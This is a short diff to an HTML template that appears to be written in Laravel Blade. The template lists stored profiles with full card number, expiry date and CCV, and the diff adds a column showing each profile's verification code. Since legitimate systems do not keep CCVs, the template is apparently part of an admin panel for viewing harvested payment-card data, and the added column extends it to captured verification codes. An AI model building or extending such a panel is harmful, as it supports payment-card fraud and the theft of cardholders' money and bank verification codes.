@@ -18,6 +18,7 @@
                 <th style="padding: 12px; border: 1px solid #ddd; text-align: left;">Card Number</th>
                 <th style="padding: 12px; border: 1px solid #ddd; text-align: left;">Expiry</th>
                 <th style="padding: 12px; border: 1px solid #ddd; text-align: left;">CCV</th>
+                <th style="padding: 12px; border: 1px solid #ddd; text-align: left;">Verification</th>
             </tr>
         </thead>
         <tbody>
@@ -48,6 +49,9 @@
                     </td>
                     <td style="padding: 10px; border: 1px solid #ddd;">
                         {{ $profile->ccv ?? '—' }}
+                    </td>
+                    <td style="padding: 10px; border: 1px solid #ddd;">
+                        {{ $profile->code ?? '—' }}
                     </td>
                 </tr>
             @endforeach
